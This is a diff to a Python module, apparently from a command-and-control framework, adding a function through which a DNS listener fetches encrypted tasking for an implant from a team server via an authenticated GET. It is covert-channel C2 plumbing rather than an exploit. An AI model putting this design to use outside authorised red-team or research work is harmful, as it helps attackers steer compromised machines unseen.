@@ -17,6 +17,7 @@ double it.
 import json
 import logging
 import urllib.error
+import urllib.parse
 import urllib.request
 from typing import Optional
 
@@ -120,3 +121,47 @@ def _payload_of(raw: bytes, url: str) -> Optional[str]:
 
     logger.debug("relay: no payload field in the answer from %s", url)
     return None
+
+
+def fetch_tasking(agent_id: str, *, url: str, token: str,
+                  timeout: float = 30.0) -> Optional[str]:
+    """Ask the team server for an agent's next tasking, already encrypted.
+
+    The DNS channel carries nothing upstream -- a bare TXT query, with the
+    agent id in the name and no payload -- so there is nothing for `relay`
+    to forward. This is the other shape the same hop takes: a GET, an id,
+    and an opaque answer. The listener still never holds a key.
+
+    `url` is the team server's agent socket; `/api/v1/dns/<agent_id>` is
+    appended. The token is a shared secret checked per request, because the
+    beacon never calls this route and a listener always does: without one,
+    anyone could walk the agent names -- which come from a fixed word list
+    -- and take tasking the real beacon would then never see.
+
+    `None` means no tasking, or a failure. The caller cannot tell them
+    apart and must not: both mean "answer with no record".
+    """
+    target = "%s/api/v1/dns/%s" % (url.rstrip("/"),
+                                   urllib.parse.quote(agent_id, safe=""))
+    request = urllib.request.Request(
+        target, method="GET", headers={"X-Listener-Token": token})
+    try:
+        with urllib.request.urlopen(request, timeout=timeout) as response:
+            if response.status != 200:
+                logger.debug("fetch_tasking: status %s", response.status)
+                return None
+            raw = response.read(_MAX_ANSWER_BYTES + 1)
+            if len(raw) > _MAX_ANSWER_BYTES:
+                logger.debug("fetch_tasking: answer exceeded %d bytes",
+                             _MAX_ANSWER_BYTES)
+                return None
+    except urllib.error.HTTPError as exc:
+        # 401 here means the token is wrong, which is a configuration
+        # fault worth seeing rather than a quiet empty answer.
+        logger.debug("fetch_tasking: HTTP %s for %s", exc.code, agent_id)
+        return None
+    except (urllib.error.URLError, OSError, ValueError) as exc:
+        logger.debug("fetch_tasking: %s", exc)
+        return None
+
+    return _payload_of(raw, target)
